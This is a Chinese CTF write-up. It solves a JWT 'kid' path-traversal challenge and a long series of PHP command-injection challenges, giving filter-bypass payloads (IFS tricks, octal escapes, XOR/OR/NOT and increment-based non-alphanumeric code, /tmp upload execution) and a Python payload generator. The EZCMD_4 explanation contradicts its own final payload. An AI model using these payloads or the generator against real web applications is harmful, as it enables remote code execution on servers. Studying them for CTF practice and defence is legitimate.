本题出现的是基于文件系统的 `kid` 参数漏洞。这里首选的目标是 Linux 系统中的 `/dev/null`（空设备文件）。该文件的特性是：任何对它的读取操作都会立刻返回 EOF（文件结束标志），这意味着后端读取到的密钥内容永远是一个空字符串 `""`。

具体操作步骤：

1. 进入 bp 上方的 `JWT Editor` 界面，选择 `New Symmetric Key`。
2. 在弹出的窗口底部直接编辑 JSON 配置区域，将 `k` 的值修改为空字符串 `""` ，点击确认保存。
3. 回到 `Repeater` 界面，在 JSON Web Token 面板中，将 Header 的 `kid` 修改为 `../../../../../../dev/null`（多写几个 `../` 确保能穿越到系统根目录）。
4. 将 Payload 中的 guest 全改为 admin。
5. 点击 Sign，选择刚刚生成的空密钥进行签名，发送请求即可拿到 flag。

## EZCMD

```php
<?php

error_reporting(0);
if (isset($_POST['cmd'])) {
    $cmd = escapeshellcmd($_POST['cmd']);
    system($cmd);
}
show_source(__FILE__);
?>
```

```http
cmd=nl /flag
```

## EZCMD_1

```php
<?php

error_reporting(0);
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    system("ping -c 5 ".$cmd);
}
show_source(__FILE__);
?>
```

```http
cmd=aaa||cat /flag
```

## EZCMD_2

```php
<?php

error_reporting(0);
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    system($cmd." >/dev/null 2>&1");
}
show_source(__FILE__);
?>
```

```http
cmd=cat /flag;
```

## EZCMD_3

```php
<?php

error_reporting(0);
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if (strpos($cmd, ' ') !== false) {
        die('no space allowed');
    }
    system($cmd." >/dev/null 2>&1");
}
show_source(__FILE__);
?>
```

> `strpos` 函数用于查找字符串在另一字符串中**首次出现的位置**（返回索引整数），如果未找到则返回 `false`。

```http
cmd=cat${IFS}$9/flag;
```

## EZCMD_4

咦，蜘蛛好吓人。看到标签页上面写着 robot ，访问 `/robots.txt` ，得到下一步是去访问 `/4atP5Aup.php` 。

```php
<?php

error_reporting(0);
if (isset($_POST['cmd'])) {
    $cmd = escapeshellcmd($_POST['cmd']);
    if (!preg_match('/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|{|}|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\'|\"|id|whoami/i', $cmd)) {
        system($cmd);
    }
}
show_source(__FILE__);
?>
```

> `escapeshellcmd()` 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 `exec()` 或 `system` 函数，或者执行操作符之前进行转义。
>
> 反斜线（\）会在以下字符之前插入：``& # ; ` | * ? ~ <> ^ () [] {} $ \``、`\x0A` 和 `\xFF`。 `'` 和 `"` 仅在不配对儿的时候被转义。在 Windows 平台上，所有这些字符以及 `%` 和 `!` 字符前面都有一个插入符号（`^`）。

过滤的有点多的离谱，但实际上跟没有差不多，利用 `escapeshellcmd()` 处理换行符时会自动添加反斜杠的特性，将关键字用换行符拆开以绕过正则检测，并在底层执行时重新拼接。

即 payload ：

```http
cmd=ca
t /fl
ag
```

但是这里不能用 hackbar 传参，原因是在 HackBar 的输入框里按下回车键换行时，浏览器实际插入的不是纯粹的 Linux 换行符 `\n` ，而是 Windows 风格的**回车换行符 `\r\n`** 。

因此要在 bp 中传入 `cmd=dd%20if%3d%2fflag` 。

## EZCMD_5

```php
<?php
//flag在/flag.txt文件中
error_reporting(0);
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if (preg_match('/[a-zA-Z]/', $cmd)) {
        die('no letter allowed');
    }
    system($cmd);
}
show_source(__FILE__);
?>
```

没有过滤数字的无字母 RCE，使用 ANSI-C 风格的转义，格式为 `$'...'` ，省略号中用八进制表示。

```http
cmd=$'\143\141\164' $'\57\146\154\141\147\56\164\170\164'
```

即 `cat /flag.txt`

## EZCMD_6

```php
<?php @eval($_POST['qc']);
show_source(__FILE__);
?>
```

```http
qc=system('cat /flag');
```

## EZCMD_7

```php
<?php
error_reporting(0);
if(isset($_GET['qc'])){
    $qc = $_GET['qc'];
    if(!preg_match("/flag/i", $qc)){
        eval($qc);
    }
}else{
    highlight_file(__FILE__);
}
?>
```

```http
?qc=system('cat /fla?');
```

## EZCMD_8

```php
<?php
error_reporting(0);
if(isset($_GET['qc'])){
    $qc = $_GET['qc'];
    if(!preg_match("/flag|system/i", $qc)){
        eval($qc);
    }
}else{
    highlight_file(__FILE__);
}
?>
```

```http
?qc=passthru('cat /fla?');
```

## EZCMD_9

```php
<?php
error_reporting(0);
if(isset($_GET['qc'])){
    $qc = $_GET['qc'];
    if(!preg_match("/system| /i", $qc)){
        eval($qc);
    }
}else{
    highlight_file(__FILE__);
}
?>
```

```http
?qc=passthru('cat${IFS}$9/fla?');
```

## EZCMD_10

```php
<?php
error_reporting(0);
if(isset($_GET['qc'])){
    $qc = $_GET['qc'];
    if(!preg_match("/;/i", $qc)){
        eval($qc);
    }
}else{
    highlight_file(__FILE__);
}
?>
//flag在根目录的flag.txt文件中 //flag在根目录的flag.txt文件中
```

```http
?qc=passthru('cat${IFS}$9/fla*')?>
```

## EZCMD_11

```php
<?php
//flag在flag.php文件中
error_reporting(0);
if(isset($_GET['qc'])){
    $qc = $_GET['qc'];
    if(!preg_match("/;/i", $qc)){
        eval($qc);
    }
 
}else{
    highlight_file(__FILE__);
}
?>
```

```http
?qc=passthru('tac${IFS}$9fla*')?>
```

## EZCMD_12

```php
<?php
//flag在flag.php文件中
error_reporting(0);
if (isset($_GET['qc'])) {
    $qc = $_GET['qc'];
    if (!preg_match("/['\"\?<>\.\$\{\}:\\\\~^@*\-+=\[\]\,]/", $qc)) {
        eval($qc);
    }
} else {
    highlight_file(__FILE__);
}
?>
```

过滤了 `' " ? <> . $ {} : \ ~ ^  * - + = [] ,` 。

由于过滤了小数点 `.` 和通配符 `?` 、 `*` ，导致 `flag.php` 不好绕过，可以用无参数 RCE 的思路绕过：

```http
?qc=eval(next(current(get_defined_vars())));&a=system('tac flag.php');
```

## EZCMD_13

```php
<?php
$re = isset($_GET['re']) ? $_GET['re'] : '';
$str = isset($_GET['str']) ? $_GET['str'] : '';

if ($re === '' || $str === '') {
    highlight_file(__FILE__);
    exit;
}

echo preg_replace(
    '/(' . $re . ')/ei',
    'strtolower("\\1")',
    $str
);
```

> **preg_replace() (/e 模式)**  
>
> (PHP 7.0 移除)， `/e` 修饰符会让正则替换后的字符串作为 PHP 代码执行。
>
> ```php
> <?php preg_replace("/test/e", $_POST["cmd"], "just test case"); ?>
> ```
>
> **POST Payload:** `cmd=system('whoami')`

`\\1` 是一个动态占位符，指把前面正则表达式里第一个匹配到的实际内容替换到这个位置。

可能会让人想到传入 `");system('ls');//`，让代码变成 `strtolower("");system('ls');//")` ，但 `preg_replace` 的 `/e` 模式有一个底层安全机制：**它会自动对传入的单引号、双引号和反斜杠进行转义（加反斜杠）**。

此时可以利用 PHP 复杂变量语法，当 PHP 在解析过程中遇到 `${expression}` 结构时，解析器首先执行花括号 `{}` 内部的表达式，例如：

```http
?re=.*&str=${phpinfo()}
```

考虑到引号会被转义，因此构造 payload ：

```http
?re=.*&str=${system($_GET[1])}&1=cat /flag
```

## EZCMD_14

```php
<?php
error_reporting(0);
if(isset($_GET['qc'])){
    $qc = $_GET['qc'];
    if(!preg_match("/[a-zA-Z0-9]/", $qc)){
        eval($qc);
    }
}else{
    highlight_file(__FILE__);
}
?>
```

无字母数字 RCE ，这里提供五种解法：

1. 异或绕过：

   利用 PHP 允许对字符串进行按位异或运算的特性，将两个非字母数字的字符进行异或（`^`），使其底层的 ASCII 码位运算结果正好等于需要的字母。

   ```http
   ?qc=('%08%02%08%08%05%0d'^'%7b%7b%7b%7c%60%60')('%03%01%08%00%00%06%0c%01%07'^'%60%60%7c%20%2f%60%60%60%60');
   ```

2. 或运绕过：

   利用 PHP 的按位或运算（`|`），将两个精心挑选的非字母数字字符的 ASCII 码进行二进制或操作，拼凑出目标字母。

   ```http
   ?qc=('%13%19%13%14%05%0d'|'%60%60%60%60%60%60')('%03%01%14%00%00%06%0c%01%07'|'%60%60%60%20%2f%60%60%60%60');
   ```

3. 取反绕过：

   利用 PHP 的按位取反操作（`~`），将目标字母的 ASCII 码进行按位取反得到不可见的单字节字符，在执行时再对该不可见字符使用 `~` 操作符即可将其还原回原始字母。

   ```http
   ?qc=(~'%8c%86%8c%8b%9a%92')(~'%9c%9e%8b%df%d0%99%93%9e%98');
   ```

4. 自增绕过：

   利用 PHP 弱类型隐式转换结合 Perl 风格的字符串自增特性（`++`），先通过特殊符号组合提取出基础字母（如从 `"Array"` 提取 `A` 或 `a`），再通过连续自增推导出所需的函数名。

   ```http
   ?qc=$_=[];$_=@"$_";$_=$_[ "!"=="@" ];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$____=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_____=$_;$_++;$______=$_;$_++;$_++;$_++;$_++;$_++;$_______=$_;$________=$_____;$________.=$_______;$________.=$_____;$________.=$______; $________.=$__; $________.=$____;$__________="_";$__________.=$___;$__________.=$__; $__________.=$______; $________(${$__________}["_"]);
   ```

   即 `SYSTEM(${"_GET"}["_"]);` ，用参数 `_` 进行命令执行即可。但是参数值里面有 `+` ，需要先进行一次 URL 编码才能用 hackbar 传参，否则会被解析成空格。

   ```http
   ?qc=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B%20%22!%22%3D%3D%22%40%22%20%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24____%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_____%3D%24_%3B%24_%2B%2B%3B%24______%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_______%3D%24_%3B%24________%3D%24_____%3B%24________.%3D%24_______%3B%24________.%3D%24_____%3B%24________.%3D%24______%3B%20%24________.%3D%24__%3B%20%24________.%3D%24____%3B%24__________%3D%22_%22%3B%24__________.%3D%24___%3B%24__________.%3D%24__%3B%20%24__________.%3D%24______%3B%20%24________(%24%7B%24__________%7D%5B%22_%22%5D)%3B&_=cat /flag
   ```

5. 临时文件绕过：

   利用向 PHP 发送 POST 文件上传请求时，系统会自动在 `/tmp` 目录下生成随机文件名的临时文件的特性，通过纯符号构造的 Linux 通配符去匹配并执行该临时文件中的恶意代码。

   首先做一个可以上传文件的网页：

   ```html
   <!DOCTYPE html>
   <html lang="en">
   <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>POST数据包POC</title>
   </head>
   <body>
   <form action="http://docker.qingcen.net:43066/" method="post" enctype="multipart/form-data">
   <label for="file">文件名：</label>
       <input type="file" name="file" id="file"><br>
       <input type="submit" name="submit" value="提交">
   </form>
   </body>
   </html>
   ```

   然后上传一个`shell.sh`文件并用bp抓包

   1. 传入：

      ```http
      ?qc=%3F%3E%3C%3F%3D%60.%20%2F%3F%3F%3F%2F%3F%3F%3F%3F%3F%3F%3F%3F%5B%40-%5B%5D%60%3B
      ```

      即 ``?qc=?><?=`. /???/????????[@-[]`;``
      如果源码不是 `eval($qc);` 而是 `system($qc);` ，只需要传入 ``?qc=. /???/????????[@-[]`` 

   2. `shell.sh`的文件内容改成：

      ```sh
      #!/bin/sh
      cat /flag
      ```

   如果没有回显就多发送几次。

这是 AI 生成的异或、或运、取反三合一脚本：

```python
import sys
import urllib.parse

def get_valid_chars():
    valid = set()
    for i in range(256):
        c = chr(i)
        if not c.isalnum():
            valid.add(c)
    return valid

def generate_xor(target_str, valid_chars):
    str1 = ""
    str2 = ""
    for char in target_str:
        found = False
        for c1 in valid_chars:
            c2_ord = ord(char) ^ ord(c1)
            c2 = chr(c2_ord)
            if c2 in valid_chars:
                str1 += "%" + hex(ord(c1))[2:].zfill(2)
                str2 += "%" + hex(ord(c2))[2:].zfill(2)
                found = True
                break
        if not found:
            print(f"Error: Cannot generate XOR for character '{char}'")
            return None, None
    return str1, str2

def generate_or(target_str, valid_chars):
    str1 = ""
    str2 = ""
    for char in target_str:
        found = False
        for c1 in valid_chars:
            for c2 in valid_chars:
                if (ord(c1) | ord(c2)) == ord(char):
                    str1 += "%" + hex(ord(c1))[2:].zfill(2)
                    str2 += "%" + hex(ord(c2))[2:].zfill(2)
                    found = True
                    break
            if found: break
        if not found:
            print(f"Error: Cannot generate OR for character '{char}'")
            return None, None
    return str1, str2

def generate_not(target_str):
    result = ""
    for char in target_str:
        inverted = ~ord(char) & 0xFF 
        result += "%" + hex(inverted)[2:].zfill(2)
    return result

def main():
    print("--- PHP Non-Alphanumeric RCE Generator ---")
    print("Modes: 1. XOR (^), 2. OR (|), 3. NOT (~)")
    
    try:
        mode = input("Select Mode (1/2/3): ").strip()
        func = input("Enter Function (e.g., system): ").strip()
        cmd = input("Enter Command (e.g., ls): ").strip()
    except KeyboardInterrupt:
        sys.exit(0)

    valid_chars = get_valid_chars()
    final_payload = ""

    if mode == '1':
        f1, f2 = generate_xor(func, valid_chars)
        c1, c2 = generate_xor(cmd, valid_chars)
        if f1 and c1: final_payload = f"('{f1}'^'{f2}')('{c1}'^'{c2}');"

    elif mode == '2':
        f1, f2 = generate_or(func, valid_chars)
        c1, c2 = generate_or(cmd, valid_chars)
        if f1 and c1: final_payload = f"('{f1}'|'{f2}')('{c1}'|'{c2}');"

    elif mode == '3':
        f_not = generate_not(func)
        c_not = generate_not(cmd)
        final_payload = f"(~'{f_not}')(~'{c_not}');"

    else:
        print("Invalid mode selected.")
        return

    if final_payload:
        print("\n[+] Original Payload:")
        print("-" * 60)
        print(final_payload)
        print("-" * 60)
        
        url_encoded_payload = urllib.parse.quote(final_payload, safe='%')
        
        print("\n[+] URL Encoded Payload (for HTTP GET/POST):")
        print("-" * 60)
        print(url_encoded_payload)
        print("-" * 60)

if __name__ == "__main__":
    main()
```

